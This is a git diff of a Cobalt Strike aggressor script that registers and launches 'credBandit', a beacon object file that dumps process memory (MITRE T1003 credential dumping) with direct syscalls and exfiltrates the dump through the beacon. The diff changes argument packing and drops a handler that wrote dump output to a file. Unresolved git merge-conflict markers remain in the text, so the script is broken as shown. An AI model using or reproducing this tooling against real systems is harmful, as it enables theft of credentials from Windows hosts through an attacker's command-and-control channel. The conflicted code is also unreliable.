@@ -1,10 +1,22 @@
 #Register command
 beacon_command_register(
+<<<<<<< HEAD
+    "credBandit", 
+    "runs an all in memory custom MiniDumpWriteDump implementation using static x64 syscalls and exfiltrates the data back through your beacon or can write to disk.", 
+    "Synopsis: credBandit <target PID> [download name]"
+);
+
+
+
+=======
 "credBandit", 
 "runs an all in memory custom MiniDumpWriteDump implementation using static x64 syscalls and exfiltrates the data back through your beacon or can write to disk.", 
 "Synopsis: credBandit [target PID]");
+>>>>>>> 50eb6fb0931c8a9dd6ba4b31a5d4fcfa8da9d1c0
 alias credBandit {
-    local('$barch $handle $data $args');
+    local('$barch $handle $data $args $target_pid');
+
+    println(@_);
     
     # figure out the arch of this session
     $barch  = barch($1);
@@ -13,44 +25,29 @@ alias credBandit {
     $handle = openf(script_resource("credBandit $+ $barch $+ .o"));
     $data = readb($handle, -1);
     closef($handle);
-    if(size(@_) < 2)
+    if(size(@_) == 2)
     {
+        # pack just the pid
+        #$args = bof_pack($1, "iz", $2, $3);
+        $args = bof_pack($1, "i", $2);
+        
+    } else if (size(@_) == 3){
+        # pack the pid and the file name to save as
+        $args = bof_pack($1, "izi", $2, $3, strlen($3));
+
+    } else {
         berror($1, "Incorrect usage!");
         berror($1, beacon_command_detail("credBandit"));
         return;
     }
-	
-    # pack our arguments
-    $args = bof_pack($1, "iz", $2, $3);
+        
 
     # announce what we're doing 
-    btask($1, "Running credBandit by (@anthemtotheego)");
+    btask($1, "Running credBandit by (@anthemtotheego)", "T1003");
 
     # execute it.
     beacon_inline_execute($1, $data, "go", $args);
 }
 
-
-#Grab output and write to file
-set BEACON_OUTPUT {
-	local('$handle');
-
-	$length = strlen($2);
-
-	if ( $length > 100 ) {
-
-		$handle = openf(">> dumpFile.txt");
-		writeb($handle, $2);
-		closef($handle);
-	} 
-	#else if ( $length = 18 ) {# Leaving this here if you want to try and add automation of the cleanup script
-	
-	#	exec(script_resource("./cleanupMiniDump.sh"));
-	#	return "\c9[+]\o " . replace($2, "([a-z]):\n", "\$1\cE:\n\o", 1);
-	#}
-	else {
-		return "\c9[+]\o " . replace($2, "([a-z]):\n", "\$1\cE:\n\o", 1);
-	};
-}
 
 
